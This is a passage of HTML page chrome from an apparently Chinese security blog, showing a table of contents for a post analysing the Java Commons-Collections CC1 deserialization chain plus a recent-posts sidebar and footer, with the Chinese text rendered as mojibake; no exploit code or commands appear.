toc-level-3"><a class="toc-link" href="#commons-collections%E4%B8%AD%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">commons-collectionsä¸­éƒ¨åˆ†æºç ä¸‹è½½ï¼š</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEjdk8u-jdk8u-jdk-af660750b2f4%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">è®¿é—®jdk8u&#x2F;jdk8u&#x2F;jdk: af660750b2f4ä¸‹è½½æºç </span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%E8%B0%83%E7%94%A8%EF%BC%9ATransformer"><span class="toc-number">1.2.</span> <span class="toc-text">ç¬¬ä¸€æ­¥è°ƒç”¨ï¼šTransformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9ATransformedMap-checkSetValue-%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.</span> <span class="toc-text">ç¬¬äºŒæ­¥ï¼šTransformedMap.checkSetValue()çš„è°ƒç”¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9AAnnotationInvocationHandler-readObject"><span class="toc-number">1.4.</span> <span class="toc-text">ç¬¬ä¸‰æ­¥ï¼šAnnotationInvocationHandler.readObject()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81EXP%E4%B8%ADRuntime%E5%AF%B9%E8%B1%A1cmd%E5%9B%A0%E4%B8%BARuntime%E7%B1%BB%E6%B2%A1%E6%9C%89%E7%BB%A7%E6%89%BFSerializable%E6%8E%A5%E5%8F%A3%EF%BC%8C%E4%B8%8D%E5%8F%AF%E4%BB%A5%E8%A2%AB%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%82"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">1ã€EXPä¸­Runtimeå¯¹è±¡cmdå› ä¸ºRuntimeç±»æ²¡æœ‰ç»§æ‰¿Serializableæ¥å£ï¼Œä¸å¯ä»¥è¢«åºåˆ—åŒ–ã€‚</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E4%B8%A4%E4%B8%AAif%E5%88%A4%E6%96%AD"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">ç»•è¿‡ä¸¤ä¸ªifåˆ¤æ–­</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81AnnotationInvocationHandler%E7%B1%BB%E7%9A%84readObject-%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8-%E7%9A%84setValue-%E6%96%B9%E6%B3%95%E7%9A%84%E5%8F%82%E6%95%B0%E4%B8%8D%E5%8F%AF%E6%8E%A7%E3%80%82"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">3ã€AnnotationInvocationHandlerç±»çš„readObject()æ–¹æ³•è°ƒç”¨ çš„setValue()æ–¹æ³•çš„å‚æ•°ä¸å¯æ§ã€‚</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/8e2aa821/" title="æ–°æ‰‹ç³»åˆ—--è¿·ä½ å¤©çŒ«å•†åŸç³»ç»Ÿä»£ç å®¡è®¡æµç¨‹">æ–°æ‰‹ç³»åˆ—--è¿·ä½ å¤©çŒ«å•†åŸç³»ç»Ÿä»£ç å®¡è®¡æµç¨‹</a><time datetime="2025-12-26T13:26:21.000Z" title="å‘è¡¨äº 2025-12-26 21:26:21">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/d57df2e9/" title="å…³äºk8sæ”»é˜²çš„éšç¬”">å…³äºk8sæ”»é˜²çš„éšç¬”</a><time datetime="2025-11-18T14:07:04.000Z" title="å‘è¡¨äº 2025-11-18 22:07:04">2025-11-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/89a18773/" title="javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ">javaååºåˆ—åŒ–ä¹‹cc1é“¾åˆ†æ</a><time datetime="2025-11-08T07:43:28.000Z" title="å‘è¡¨äº 2025-11-08 15:43:28">2025-11-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/c74d1264/" title="æµ…è°ˆpyramidæ¡†æ¶ä¸‹çš„æ ˆå¸§é€ƒé€¸">æµ…è°ˆpyramidæ¡†æ¶ä¸‹çš„æ ˆå¸§é€ƒé€¸</a><time datetime="2025-11-07T17:55:14.000Z" title="å‘è¡¨äº 2025-11-08 01:55:14">2025-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Timind</span><span class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>